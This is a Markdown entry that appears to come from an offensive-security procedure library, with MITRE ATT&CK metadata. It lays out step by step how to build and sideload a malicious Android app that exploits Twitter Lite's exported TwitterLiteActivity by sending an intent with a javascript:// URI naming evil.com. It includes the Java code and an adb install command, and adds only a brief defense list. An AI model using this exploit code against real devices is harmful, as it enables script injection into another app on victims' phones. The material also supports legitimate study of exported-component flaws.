---
tags:
  - android
  - malicious-app
  - intent-injection
type: procedure
tools:
  - '[[tools/ADB-Android-Debug-Bridge]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1566.001]]'
updated_at: '2025-12-14T17:24:31.837Z'
sub_techniques: []
id: 1a553dbc-e061-4605-b76c-132e35727ead
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[T1566.001]]'
---
# Launch Attack from Malicious App Targeting TwitterLiteActivity

## Summary

This procedure demonstrates sideloading a malicious Android app that creates and sends intents to the vulnerable TwitterLiteActivity with malicious URIs, replicating ADB attacks in a real-world, non-debug scenario.

## Description

In app code, construct an Intent with ACTION_VIEW, set the component to TwitterLiteActivity, and data to a javascript:// or file:// URI. Calling startActivity triggers the vuln without ADB, allowing malware to exploit on infected devices.

## Requirements

1. Android development environment (e.g., Android Studio)
2. Ability to install custom APKs on the device
3. Knowledge of Android Intent API

## Defense

Defensive measures and detection strategies:

- Use signature-based app verification or restrict inter-app intents
- Implement PendingIntent or explicit component checks
- Scan for and block sideloaded malicious apps

## Objectives

1. Achieve exploitation without debugging tools
2. Simulate malware-driven attacks
3. Highlight risks of exported components

## Instructions

### Step 1: Create Malicious App Code

**Context**: In MainActivity.java or Kotlin, build the intent.

Code snippet:
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setClassName("com.twitter.android.lite", "com.twitter.android.lite.TwitterLiteActivity");
intent.setData(Uri.parse("javascript://evil.com%0A alert(1);"));
startActivity(intent);

### Step 2: Build and Install App

**Context**: Compile APK and sideload via ADB or file transfer.

```bash
adb install malicious.apk
```
Launch the app to trigger the intent.

**Expected Output**: Twitter Lite opens with the malicious payload executed.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[T1566.001]] Phishing: Spearphishing Attachment

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/ADB-Android-Debug-Bridge]]

## Tags

- android
- malicious-app
- intent-injection
